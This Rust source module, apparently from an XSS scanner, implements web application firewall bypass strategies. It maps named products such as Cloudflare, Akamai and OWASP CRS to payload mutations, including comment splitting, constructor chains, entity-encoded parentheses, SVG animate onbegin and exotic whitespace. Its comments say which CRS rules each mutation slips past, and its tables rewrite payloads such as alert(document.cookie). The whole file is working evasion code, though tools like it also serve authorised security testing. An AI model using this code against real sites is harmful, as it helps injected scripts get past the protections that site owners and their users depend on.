//! WAF-specific bypass strategies.
//!
//! Each detected WAF type maps to a set of encoding, mutation, and evasion
//! techniques optimized for that particular WAF.

use super::WafType;

/// Types of payload mutations that can be applied for WAF bypass.
///
/// `Display` produces a stable PascalCase name suitable for JSON keys
/// in `target_summary.waf.bypass.mutations_applied[]`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum MutationType {
    /// Insert HTML comments inside tag names: `<scr<!---->ipt>`
    HtmlCommentSplit,
    /// Tab/newline between tag and attribute: `<img\t\nsrc=x>`
    WhitespaceMutation,
    /// JavaScript comment splitting: `al/**/ert(1)`
    JsCommentSplit,
    /// Backtick instead of parentheses: `` alert`1` ``
    BacktickParens,
    /// Constructor chain: `[].constructor.constructor('alert(1)')()`
    ConstructorChain,
    /// Unicode escapes in JS: `\u0061lert(1)`
    UnicodeJsEscape,
    /// Mixed decimal/hex HTML entities
    MixedHtmlEntities,
    /// Alternating case for HTML tags: `<ScRiPt>`
    CaseAlternation,
    // ── CRS-targeting mutations ─────────────────────────────────────
    /// Use `/` instead of space between tag and attributes: `<svg/onload=alert(1)>`
    /// Bypasses CRS 941160 regex that expects whitespace before attributes.
    SlashSeparator,
    /// Replace parentheses with HTML entities: `alert&#40;1&#41;`
    /// Bypasses CRS 941370 JS function call detection.
    HtmlEntityParens,
    /// SVG animate/set element execution: `<svg><animate onbegin=alert(1) attributeName=x>`
    /// Bypasses CRS 941110 tag denylist which may not include SVG animation elements.
    SvgAnimateExec,
    /// Exotic whitespace chars (vertical tab 0x0B, form feed 0x0C) between tag and attrs.
    /// Bypasses CRS 941320 tag handler regex that only checks \\s (space/tab/newline).
    ExoticWhitespace,
}

impl std::fmt::Display for MutationType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let name = match self {
            MutationType::HtmlCommentSplit => "HtmlCommentSplit",
            MutationType::WhitespaceMutation => "WhitespaceMutation",
            MutationType::JsCommentSplit => "JsCommentSplit",
            MutationType::BacktickParens => "BacktickParens",
            MutationType::ConstructorChain => "ConstructorChain",
            MutationType::UnicodeJsEscape => "UnicodeJsEscape",
            MutationType::MixedHtmlEntities => "MixedHtmlEntities",
            MutationType::CaseAlternation => "CaseAlternation",
            MutationType::SlashSeparator => "SlashSeparator",
            MutationType::HtmlEntityParens => "HtmlEntityParens",
            MutationType::SvgAnimateExec => "SvgAnimateExec",
            MutationType::ExoticWhitespace => "ExoticWhitespace",
        };
        f.write_str(name)
    }
}

/// Per-target effectiveness telemetry for the WAF bypass pass.
///
/// `variants_generated` records, per `MutationType`, how many distinct
/// payload variants the mutation contributed *for this target*
/// (post-dedup, pre-encoder). It's a "did the mutation even apply"
/// signal — a value of 0 means the strategy declared the mutation but
/// the target's payload set didn't shape-match any of it.
///
/// `bypass_requests` is the total HTTP request count sent under the
/// active bypass strategy, and `bypass_blocks` is the subset that
/// returned a WAF block status (403/406/429/503). The ratio gives a
/// rough "did the bypass help" signal that surfaces alongside the
/// detected WAF in `target_summary.waf.bypass`.
#[derive(Debug, Default)]
pub struct MutationStats {
    pub variants_generated: std::sync::Mutex<std::collections::HashMap<MutationType, u64>>,
    pub bypass_requests: std::sync::atomic::AtomicU64,
    pub bypass_blocks: std::sync::atomic::AtomicU64,
}

impl MutationStats {
    pub fn record_variant(&self, m: MutationType) {
        if let Ok(mut g) = self.variants_generated.lock() {
            *g.entry(m).or_insert(0) += 1;
        }
    }
    pub fn record_request(&self, blocked: bool) {
        self.bypass_requests
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        if blocked {
            self.bypass_blocks
                .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        }
    }
    pub fn snapshot(&self) -> MutationStatsSnapshot {
        let variants = self
            .variants_generated
            .lock()
            .ok()
            .map(|g| g.clone())
            .unwrap_or_default();
        MutationStatsSnapshot {
            variants,
            bypass_requests: self
                .bypass_requests
                .load(std::sync::atomic::Ordering::Relaxed),
            bypass_blocks: self
                .bypass_blocks
                .load(std::sync::atomic::Ordering::Relaxed),
        }
    }
}

/// Plain-data view of `MutationStats` suitable for JSON serialization.
#[derive(Debug, Default, Clone)]
pub struct MutationStatsSnapshot {
    pub variants: std::collections::HashMap<MutationType, u64>,
    pub bypass_requests: u64,
    pub bypass_blocks: u64,
}

/// A bypass strategy composed of extra encoders and payload mutations.
#[derive(Debug, Clone, Default)]
pub struct BypassStrategy {
    /// Extra encoder names to add beyond user-specified ones.
    pub extra_encoders: Vec<String>,
    /// Payload mutations to apply.
    pub mutations: Vec<MutationType>,
    /// Extra delay (ms) hint to avoid rate-limiting WAFs.
    pub extra_delay_hint_ms: u64,
}

/// Get the optimal bypass strategy for a specific WAF type.
pub fn get_bypass_strategy(waf: &WafType) -> BypassStrategy {
    match waf {
        WafType::Cloudflare => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "4url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::BacktickParens,
                MutationType::JsCommentSplit,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 100,
        },
        WafType::AwsWaf => BypassStrategy {
            extra_encoders: vec!["2url".into(), "3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::WhitespaceMutation,
                MutationType::UnicodeJsEscape,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Akamai => BypassStrategy {
            extra_encoders: vec!["3url".into(), "4url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::ConstructorChain,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
            ],
            extra_delay_hint_ms: 50,
        },
        WafType::Imperva => BypassStrategy {
            extra_encoders: vec!["zwsp".into(), "unicode".into(), "2url".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::JsCommentSplit,
                MutationType::MixedHtmlEntities,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 100,
        },
        WafType::ModSecurity => BypassStrategy {
            extra_encoders: vec!["4url".into(), "2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 0,
        },
        // OWASP CRS bypass: tuned for CRS rules 941100-941380.
        // CRS uses libinjection + regex patterns for XSS detection.
        // Key weaknesses:
        // - Slash-separated tag attributes bypass 941160 regex
        // - SVG animate/set elements bypass 941110 tag denylist
        // - HTML entity-encoded parens bypass 941370 JS function detection
        // - Exotic whitespace (0x0B, 0x0C) bypass 941320 tag handler
        // - Constructor chain and backtick bypass keyword-based rules
        WafType::OwaspCrs => BypassStrategy {
            extra_encoders: vec![
                "unicode".into(),
                "4url".into(),
                "2url".into(),
                "htmlpad".into(),
                "zwsp".into(),
            ],
            mutations: vec![
                MutationType::SlashSeparator,
                MutationType::SvgAnimateExec,
                MutationType::HtmlEntityParens,
                MutationType::ExoticWhitespace,
                MutationType::BacktickParens,
                MutationType::ConstructorChain,
                MutationType::CaseAlternation,
                MutationType::HtmlCommentSplit,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Sucuri => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "2url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::F5BigIp => BypassStrategy {
            extra_encoders: vec!["3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::ConstructorChain,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Barracuda => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::MixedHtmlEntities,
                MutationType::WhitespaceMutation,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::FortiWeb => BypassStrategy {
            extra_encoders: vec!["unicode".into(), "3url".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::BacktickParens,
                MutationType::UnicodeJsEscape,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::AzureWaf => BypassStrategy {
            extra_encoders: vec!["4url".into(), "unicode".into(), "zwsp".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::UnicodeJsEscape,
                MutationType::ConstructorChain,
            ],
            extra_delay_hint_ms: 50,
        },
        WafType::CloudArmor => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::BacktickParens,
                MutationType::MixedHtmlEntities,
                MutationType::CaseAlternation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Fastly => BypassStrategy {
            extra_encoders: vec!["3url".into(), "unicode".into()],
            mutations: vec![
                MutationType::WhitespaceMutation,
                MutationType::JsCommentSplit,
                MutationType::BacktickParens,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Wordfence => BypassStrategy {
            extra_encoders: vec!["2url".into(), "unicode".into()],
            mutations: vec![
                MutationType::HtmlCommentSplit,
                MutationType::CaseAlternation,
                MutationType::BacktickParens,
                MutationType::WhitespaceMutation,
            ],
            extra_delay_hint_ms: 0,
        },
        WafType::Unknown(hint) => unknown_strategy_for(hint),
    }
}

/// Pick a bypass strategy for `WafType::Unknown(hint)` based on what the
/// detector inferred about the block. Two hint shapes reach here today:
///
///   - `"HTTP <code>"` from `fingerprint_with_probe` when a provocation
///     payload elicited a 403/406/429/503 but no header/body fingerprint
///     matched. The status code carries useful intent: 429/503 means the
///     edge is rate-limiting, 406 is content-type/encoding-driven, 403 is
///     a generic block.
///   - Arbitrary `--force-waf <name>` when the user supplied a name we
///     don't recognize. Falls through to the conservative default.
fn unknown_strategy_for(hint: &str) -> BypassStrategy {
    let lower = hint.to_ascii_lowercase();
    if lower.contains("429") || lower.contains("503") {
        // Rate-limit / overload block. Keep mutation count low so we
        // don't keep tripping the limiter; lean on a delay hint so the
        // scan-level throttle has something to reach for.
        return BypassStrategy {
            extra_encoders: vec!["unicode".into(), "2url".into()],
            mutations: vec![MutationType::CaseAlternation],
            extra_delay_hint_ms: 1500,
        };
    }
    if lower.contains("406") {
        // Content-type / encoding-driven block. Heavier encoder mix
        // (mutations alone won't change the wire encoding the WAF cares
        // about); skip mutations that don't shift bytes meaningfully.
        return BypassStrategy {
            extra_encoders: vec![
                "unicode".into(),
                "2url".into(),
                "3url".into(),
                "4url".into(),
            ],
            mutations: vec![
                MutationType::MixedHtmlEntities,
                MutationType::UnicodeJsEscape,
                MutationType::HtmlCommentSplit,
            ],
            extra_delay_hint_ms: 0,
        };
    }
    // Generic 403 / forced-unknown: conservative default that exercises
    // the most common WAF weaknesses without committing to a specific
    // vendor's behavior.
    BypassStrategy {
        extra_encoders: vec!["2url".into(), "unicode".into(), "zwsp".into()],
        mutations: vec![
            MutationType::HtmlCommentSplit,
            MutationType::BacktickParens,
            MutationType::CaseAlternation,
            MutationType::WhitespaceMutation,
        ],
        extra_delay_hint_ms: 0,
    }
}

/// Merge bypass strategies from multiple detected WAFs into a single combined strategy.
pub fn merge_strategies(waf_types: &[&WafType]) -> BypassStrategy {
    let mut combined = BypassStrategy::default();
    let mut seen_encoders = std::collections::HashSet::new();
    let mut seen_mutations = std::collections::HashSet::new();

    for waf in waf_types {
        let strategy = get_bypass_strategy(waf);

        // Merge extra encoders (deduplicate via HashSet)
        for enc in strategy.extra_encoders {
            if !seen_encoders.contains(&enc) {
                seen_encoders.insert(enc.clone());
                combined.extra_encoders.push(enc);
            }
        }

        // Merge mutations (deduplicate via HashSet)
        for mutation in strategy.mutations {
            if !seen_mutations.contains(&mutation) {
                seen_mutations.insert(mutation.clone());
                combined.mutations.push(mutation);
            }
        }

        // Take the max delay hint
        combined.extra_delay_hint_ms = combined
            .extra_delay_hint_ms
            .max(strategy.extra_delay_hint_ms);
    }

    combined
}

/// Apply payload mutations to a list of base payloads, generating additional bypass variants.
/// Returns the original payloads plus mutated variants.
///
/// The `max_variants_per_payload` parameter caps how many mutation variants are generated
/// per base payload to prevent payload explosion.
pub fn apply_mutations(
    payloads: &[String],
    mutations: &[MutationType],
    max_variants_per_payload: usize,
) -> Vec<String> {
    apply_mutations_tagged(payloads, mutations, max_variants_per_payload)
        .into_iter()
        .map(|(p, _)| p)
        .collect()
}

/// Like `apply_mutations` but also returns each output's origin: `None`
/// for the unmodified base payload, `Some(MutationType)` for variants.
///
/// Callers that want to attribute scan outcomes to specific mutations
/// (effectiveness telemetry) consume this; callers that just need the
/// payload list use the shorter `apply_mutations`.
pub fn apply_mutations_tagged(
    payloads: &[String],
    mutations: &[MutationType],
    max_variants_per_payload: usize,
) -> Vec<(String, Option<MutationType>)> {
    let cap = payloads.len() * (1 + max_variants_per_payload.min(mutations.len()));
    let mut out: Vec<(String, Option<MutationType>)> = Vec::with_capacity(cap);
    let mut seen = std::collections::HashSet::with_capacity(cap);

    for payload in payloads {
        if seen.insert(payload.clone()) {
            out.push((payload.clone(), None));
        }

        let mut variant_count = 0;
        for mutation in mutations {
            if variant_count >= max_variants_per_payload {
                break;
            }
            let variant = apply_single_mutation(payload, mutation);
            if variant != *payload && seen.insert(variant.clone()) {
                out.push((variant, Some(*mutation)));
                variant_count += 1;
            }
        }
    }

    out
}

/// Apply a single mutation type to a payload.
fn apply_single_mutation(payload: &str, mutation: &MutationType) -> String {
    match mutation {
        MutationType::HtmlCommentSplit => html_comment_split(payload),
        MutationType::WhitespaceMutation => whitespace_mutation(payload),
        MutationType::JsCommentSplit => js_comment_split(payload),
        MutationType::BacktickParens => backtick_parens(payload),
        MutationType::ConstructorChain => constructor_chain(payload),
        MutationType::UnicodeJsEscape => unicode_js_escape(payload),
        MutationType::MixedHtmlEntities => mixed_html_entities(payload),
        MutationType::CaseAlternation => case_alternate(payload),
        MutationType::SlashSeparator => slash_separator(payload),
        MutationType::HtmlEntityParens => html_entity_parens(payload),
        MutationType::SvgAnimateExec => svg_animate_exec(payload),
        MutationType::ExoticWhitespace => exotic_whitespace(payload),
    }
}

// ── Mutation implementations ────────────────────────────────────────

/// Try the first matching `(from, to)` replacement on `payload` using a single
/// `find()` scan per pattern (no redundant `contains()` + `replacen()` double scan).
fn try_first_replace(payload: &str, patterns: &[(&str, &str)]) -> String {
    for &(from, to) in patterns {
        if let Some(pos) = payload.find(from) {
            let mut result = String::with_capacity(payload.len() + to.len() - from.len());
            result.push_str(&payload[..pos]);
            result.push_str(to);
            result.push_str(&payload[pos + from.len()..]);
            return result;
        }
    }
    payload.to_string()
}

/// Locate the first HTML tag opening (`<` followed by 2+ ASCII letters,
/// optionally preceded by `/`) and return `(letters_start, letters_len)`.
/// Used by tag-based mutations to operate on any HTML tag rather than a
/// fixed list of hardcoded names.
fn find_first_tag_name(payload: &str) -> Option<(usize, usize)> {
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let mut j = i + 1;
            if j < bytes.len() && bytes[j] == b'/' {
                j += 1;
            }
            let start = j;
            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                j += 1;
            }
            let len = j - start;
            if len >= 2 {
                return Some((start, len));
            }
        }
        i += 1;
    }
    None
}

/// Locate the first `<TAG SEP ATTR` pattern where SEP is a space or `/`
/// and ATTR is an ASCII identifier. Returns `(tag_lower, sep_index,
/// sep_char)` for the caller to act on. Single-pass over the payload.
fn find_first_tag_attr_break(payload: &str) -> Option<(String, usize, char)> {
    let bytes = payload.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'<' {
            let mut j = i + 1;
            if j < bytes.len() && bytes[j] == b'/' {
                j += 1;
            }
            let tag_start = j;
            while j < bytes.len() && bytes[j].is_ascii_alphabetic() {
                j += 1;
            }
            if j == tag_start {
                i += 1;
                continue;
            }
            // SEP must be space or `/`, followed by an attribute name letter.
            if j < bytes.len()
                && (bytes[j] == b' ' || bytes[j] == b'/')
                && j + 1 < bytes.len()
                && bytes[j + 1].is_ascii_alphabetic()
            {
                let tag = payload[tag_start..j].to_ascii_lowercase();
                let sep_char = bytes[j] as char;
                return Some((tag, j, sep_char));
            }
        }
        i += 1;
    }
    None
}

/// Replace one byte at `idx` in `payload` with `new_char` (ASCII).
/// Caller guarantees `idx` is on an ASCII byte boundary.
fn replace_byte_at(payload: &str, idx: usize, new_char: char) -> String {
    debug_assert!(payload.is_char_boundary(idx));
    debug_assert!(new_char.is_ascii());
    let mut out = String::with_capacity(payload.len());
    out.push_str(&payload[..idx]);
    out.push(new_char);
    out.push_str(&payload[idx + 1..]);
    out
}

/// Insert `<!---->` partway through the first HTML tag name encountered.
///
/// Split offset is `min(3, ceil(len/2))` so short tags (`img`, `svg`)
/// split after 2 letters and longer tags (`script`, `iframe`) split
/// after 3 — preserves prior behavior while extending coverage to every
/// HTML tag rather than the original 11-entry literal list.
fn html_comment_split(payload: &str) -> String {
    if let Some((start, len)) = find_first_tag_name(payload) {
        let split_offset = if len >= 6 {
            3
        } else if len >= 3 {
            2
        } else {
            1
        };
        let split_at = start + split_offset;
        let mut out = String::with_capacity(payload.len() + 7);
        out.push_str(&payload[..split_at]);
        out.push_str("<!---->");
        out.push_str(&payload[split_at..]);
        return out;
    }
    payload.to_string()
}

/// Pick the alt whitespace char for a `<TAG SEP ATTR` match.
///
/// Covers any HTML tag now (not the original 14-entry literal list).
/// The mapping reproduces prior outputs for the tags that were already
/// covered (svg/body → newline, details/audio → carriage return,
/// everything else → tab) and extends "tab" to every other tag.
fn whitespace_alt_char(tag_lower: &str, sep: char) -> char {
    if sep == '/' {
        return '\t';
    }
    match tag_lower {
        "svg" | "body" => '\n',
        "details" | "audio" => '\r',
        _ => '\t',
    }
}

/// Replace the space/slash between an HTML tag and its first attribute
/// with a tab/newline/CR (per `whitespace_alt_char`). Mutates the first
/// matching break in the payload.
fn whitespace_mutation(payload: &str) -> String {
    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        let alt = whitespace_alt_char(&tag, sep);
        return replace_byte_at(payload, sep_idx, alt);
    }
    payload.to_string()
}

/// JS sinks worth splitting with `/**/`. Keeping this list explicit
/// (rather than splitting any IDENT) avoids mutating identifiers that
/// just happen to contain a paren — e.g. `class=foo(bar)`.
const JS_SINK_NAMES: &[&str] = &[
    "alert",
    "confirm",
    "prompt",
    "eval",
    "Function",
    "setTimeout",
    "setInterval",
    "fetch",
    "XMLHttpRequest",
    "import",
    "execScript",
];

/// Split a JS sink name with `/**/` partway through, on the first
/// match found in the payload. Split offset is `len/2` (floor) so the
/// two halves each carry a recognizable substring — matches the prior
/// per-name behavior (`al/**/ert`, `con/**/firm`, `pro/**/mpt`, …).
/// Tries `name(` first, then `` name` `` (template-literal call form)
/// so both `alert(1)` and `` alert`1` `` get mutated.
fn js_comment_split(payload: &str) -> String {
    for name in JS_SINK_NAMES {
        if name.len() < 3 {
            continue;
        }
        let split_idx = (name.len() / 2).max(2);
        let prefix = &name[..split_idx];
        let suffix = &name[split_idx..];
        // Match either `name(` or `` name` `` to cover both the standard
        // call and the template-literal form.
        for follower in ['(', '`'] {
            let needle = format!("{}{}", name, follower);
            if let Some(pos) = payload.find(&needle) {
                let mut out = String::with_capacity(payload.len() + 4);
                out.push_str(&payload[..pos]);
                out.push_str(prefix);
                out.push_str("/**/");
                out.push_str(suffix);
                out.push(follower);
                out.push_str(&payload[pos + needle.len()..]);
                return out;
            }
        }
    }
    payload.to_string()
}

/// Replace function call parentheses with backtick template literals.
/// `alert(1)` → `` alert`1` ``
fn backtick_parens(payload: &str) -> String {
    try_first_replace(
        payload,
        &[
            ("alert(1)", "alert`1`"),
            ("alert(document.domain)", "alert`${document.domain}`"),
            ("alert(document.cookie)", "alert`${document.cookie}`"),
            ("confirm(1)", "confirm`1`"),
            ("prompt(1)", "prompt`1`"),
        ],
    )
}

/// Replace alert() calls with constructor chain to avoid keyword detection.
/// `alert(1)` → `[].constructor.constructor('alert(1)')()`
fn constructor_chain(payload: &str) -> String {
    try_first_replace(
        payload,
        &[
            ("alert(1)", "[].constructor.constructor('alert(1)')()"),
            (
                "alert(document.domain)",
                "[].constructor.constructor('alert(document.domain)')()",
            ),
            ("confirm(1)", "[].constructor.constructor('confirm(1)')()"),
            ("prompt(1)", "[].constructor.constructor('prompt(1)')()"),
        ],
    )
}

/// Replace first chars of JS function names with unicode escapes.
/// `alert` → `\u0061lert`
/// JS keywords / globals worth escaping the first letter of as
/// `\u00XX`. Restricted to identifiers a WAF regex is likely to match
/// literally; first match wins so the order is roughly priority-driven.
const JS_ESCAPE_NAMES: &[&str] = &[
    "alert",
    "confirm",
    "prompt",
    "eval",
    "document",
    "window",
    "location",
    "fetch",
    "Function",
    "setTimeout",
    "setInterval",
    "parent",
    "self",
    "top",
];

fn unicode_js_escape(payload: &str) -> String {
    for name in JS_ESCAPE_NAMES {
        if let Some(pos) = payload.find(name) {
            let first = name.as_bytes()[0];
            let escaped = format!("\\u{:04x}", first as u32);
            let mut out = String::with_capacity(payload.len() + escaped.len() - 1);
            out.push_str(&payload[..pos]);
            out.push_str(&escaped);
            out.push_str(&payload[pos + 1..]);
            return out;
        }
    }
    payload.to_string()
}

/// Encode angle brackets with mixed decimal and hex HTML entities.
/// `<` → `&#60;` (decimal), `>` → `&#x3e;` (hex)
fn mixed_html_entities(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len() * 3);
    let mut use_decimal = true;
    for c in payload.chars() {
        match c {
            '<' => {
                if use_decimal {
                    result.push_str("&#60;");
                } else {
                    result.push_str("&#x3c;");
                }
                use_decimal = !use_decimal;
            }
            '>' => {
                if use_decimal {
                    result.push_str("&#62;");
                } else {
                    result.push_str("&#x3e;");
                }
                use_decimal = !use_decimal;
            }
            '"' => {
                if use_decimal {
                    result.push_str("&#34;");
                } else {
                    result.push_str("&#x22;");
                }
                use_decimal = !use_decimal;
            }
            '\'' => {
                if use_decimal {
                    result.push_str("&#39;");
                } else {
                    result.push_str("&#x27;");
                }
                use_decimal = !use_decimal;
            }
            _ => result.push(c),
        }
    }
    result
}

// ── CRS-targeting mutation implementations ──────────────────────

/// Replace the space between an HTML tag and its first attribute with
/// `/`. CRS rule 941160 expects whitespace; the slash slips past it
/// while still being a valid attribute separator. No-op when the
/// payload already uses `/` as the separator.
fn slash_separator(payload: &str) -> String {
    if let Some((_tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        if sep == '/' {
            return payload.to_string();
        }
        return replace_byte_at(payload, sep_idx, '/');
    }
    payload.to_string()
}

/// Replace parentheses with HTML entities to bypass JS function call detection.
/// `alert(1)` → `alert&#40;1&#41;`
/// Also supports `&lpar;`/`&rpar;` named entities.
fn html_entity_parens(payload: &str) -> String {
    // Replace all occurrences of ( and ) with HTML decimal entities
    let mut result = payload.to_string();
    // Use &#40; for ( and &#41; for )
    if result.contains('(') || result.contains(')') {
        result = result.replace('(', "&#40;").replace(')', "&#41;");
    }
    result
}

/// Generate SVG animate element-based execution payload.
/// If the payload contains `<svg onload=X>`, transform to `<svg><animate onbegin=X attributeName=x dur=1s>`
/// For other payloads containing event handlers, wrap in SVG animate.
fn svg_animate_exec(payload: &str) -> String {
    // Transform svg onload variants to svg animate onbegin
    for prefix in &["<svg onload=", "<SVG ONLOAD=", "<sVg onload="] {
        if let Some(rest) = payload.strip_prefix(prefix)
            && let Some(handler_end) = rest.find('>')
        {
            let handler = &rest[..handler_end];
            let clean_handler = handler.split_whitespace().next().unwrap_or(handler);
            return format!(
                "<svg><animate onbegin={} attributeName=x dur=1s>",
                clean_handler
            );
        }
    }
    // Also transform img onerror to svg animate
    if payload.contains("<img") || payload.contains("<IMG") || payload.contains("<im") {
        for prefix in &["onerror=", "ONERROR="] {
            if let Some(idx) = payload.find(prefix) {
                let after = &payload[idx + prefix.len()..];
                let handler_end = after.find([' ', '>', '\t', '\n']).unwrap_or(after.len());
                let handler = &after[..handler_end];
                return format!("<svg><animate onbegin={} attributeName=x dur=1s>", handler);
            }
        }
    }
    payload.to_string()
}

/// Pick the alt exotic-whitespace char (\x0B vertical tab vs \x0C form
/// feed) for a `<TAG SEP ATTR` match. CRS rule 941320 only checks `\s`
/// (space/tab/newline); both VT and FF slip past it.
///
/// Mapping reproduces prior outputs for the tags previously listed —
/// svg/body/details with a space separator get `\x0C`, slash-separated
/// or any other tag get `\x0B` — and extends `\x0B` to every other tag.
fn exotic_alt_char(tag_lower: &str, sep: char) -> char {
    if sep == '/' {
        return '\x0B';
    }
    match tag_lower {
        "svg" | "body" | "details" => '\x0C',
        _ => '\x0B',
    }
}

/// Replace the separator between an HTML tag and its first attribute
/// with an exotic whitespace char. Mutates only the first match.
fn exotic_whitespace(payload: &str) -> String {
    if let Some((tag, sep_idx, sep)) = find_first_tag_attr_break(payload) {
        let alt = exotic_alt_char(&tag, sep);
        return replace_byte_at(payload, sep_idx, alt);
    }
    payload.to_string()
}

/// Alternate the case of HTML tag characters.
/// `<script>` → `<ScRiPt>`, `<img` → `<ImG`
fn case_alternate(payload: &str) -> String {
    let mut result = String::with_capacity(payload.len());
    let mut in_tag = false;
    let mut tag_char_idx = 0u32;

    for c in payload.chars() {
        if c == '<' {
            in_tag = true;
            tag_char_idx = 0;
            result.push(c);
        } else if c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '/' {
            in_tag = false;
            result.push(c);
        } else if in_tag && c.is_ascii_alphabetic() {
            if tag_char_idx.is_multiple_of(2) {
                result.push(c.to_ascii_uppercase());
            } else {
                result.push(c.to_ascii_lowercase());
            }
            tag_char_idx += 1;
        } else {
            result.push(c);
        }
    }
    result
}

#[cfg(test)]
mod tests;
